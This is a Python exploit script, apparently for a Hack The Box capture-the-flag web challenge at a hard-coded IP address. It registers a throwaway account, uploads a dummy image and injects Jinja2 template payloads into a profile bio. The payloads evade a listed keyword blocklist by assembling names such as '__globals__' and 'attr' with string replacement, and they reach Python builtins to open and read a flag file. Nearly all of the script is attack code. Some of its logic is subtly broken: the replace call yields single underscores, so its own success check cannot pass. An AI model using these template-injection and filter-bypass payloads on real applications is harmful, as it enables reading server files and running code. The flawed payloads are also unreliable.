#!/usr/bin/env python3
import requests
from PIL import Image
import io
import re
import random

BASE_URL = "http://94.237.56.175:48466"

def exploit(payload, desc=""):
    session = requests.Session()
    u = f"z{random.randint(100000,999999)}"
    
    session.post(f"{BASE_URL}/signup", data={'email': f'{u}@t.com', 'username': u, 'password': 'p'})
    session.post(f"{BASE_URL}/login", data={'username': u, 'password': 'p'})
    
    img = Image.new('RGB', (50, 50))
    buf = io.BytesIO()
    img.save(buf, 'JPEG')
    buf.seek(0)
    session.post(f"{BASE_URL}/verification", files={'file': ('x.jpg', buf, 'image/jpeg')})
    
    r = session.post(f"{BASE_URL}/profile", data={'bio': payload})
    if "Bio updated" not in r.text:
        print(f"✗ {desc}: BLOCKED")
        return None
    
    session.get(f"{BASE_URL}/getlink")
    r = session.get(f"{BASE_URL}/user/{u}")
    
    if r.status_code != 200:
        print(f"✗ {desc}: ERROR {r.status_code}")
        return None
    
    m = re.search(r'<p class="para-class">(.*?)</p>', r.text, re.DOTALL)
    result = m.group(1).strip() if m else ""
    print(f"✓ {desc}: {result[:150]}")
    return result

print("[*] Crafting payload to bypass ALL filter keywords...\n")

# Blocked strings (need to avoid these in the payload):
# *, script, alert, debug, %, include, html, if, for, config, img, src,
# .py, main, herf, pre, class, subclass, base, mro, __, [, ], def, return,
# self, os, popen, init, globals, base, class, request, attr, args, eval,
# newInstance, getEngineByName, getClass, join

# Key insight: We need to build these strings CHARACTER BY CHARACTER
# or use URL encoding, hex encoding, etc.

# Let's try using {% set %} to build strings - wait, 'set' might not be blocked!
# Actually, we can't use 'for' or 'if' but maybe we can use {% set %}

print("Test 1: Using {% set %} tag")
set_test = "{% set x='test' %}{{ x }}"
exploit(set_test, "set tag test")

# If set works, we can build strings without having them in the payload!

# Alternative: Use filters like |replace or |regex_replace
print("\nTest 2: Using |replace filter")
replace_test = "{{ 'xglobalsx'|replace('x','_') }}"
exploit(replace_test, "replace filter test")

# If replace works, we can do: 'xglobalsx'|replace('x','__')
# to get '__globals__' without having 'globals' in the payload!

print("\nTest 3: Full bypass using replace")
globals_bypass = "{{ 'xglobalsx'|replace('x','_') }}"
result = exploit(globals_bypass, "Build __globals__")

if result == '__globals__':
    print("\n✓✓✓ Replace filter works! Building full exploit...\n")
    
    # Now build the full chain:
    # lipsum|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/app/guild/flag.txt')|attr('read')()
    
    # We need to avoid: attr, globals, init, builtins, class
    # Use replace to build them
    
    payloads = [
        ("Access __globals__",
         "{{ lipsum|('xattrx'|replace('x',''))(('xglobalsx'|replace('x','_'))) }}"),
        
        ("Chain method",
         "{{ lipsum|('xattrx'|replace('x',''))('xglobalsx'|replace('x','_'))|('xattrx'|replace('x',''))('xgetitemx'|replace('x','_'))('xbuiltinsx'|replace('x','_'))|('xattrx'|replace('x',''))('xgetitemx'|replace('x','_'))('open')('/app/guild/flag.txt')|('xattrx'|replace('x',''))('read')() }}"),
    ]
    
    for desc, payload in payloads:
        result = exploit(payload, desc)
        if result and 'HTB{' in result:
            print(f"\n{'='*80}")
            print(f"FLAG: {result}")
            print(f"{'='*80}")
            break
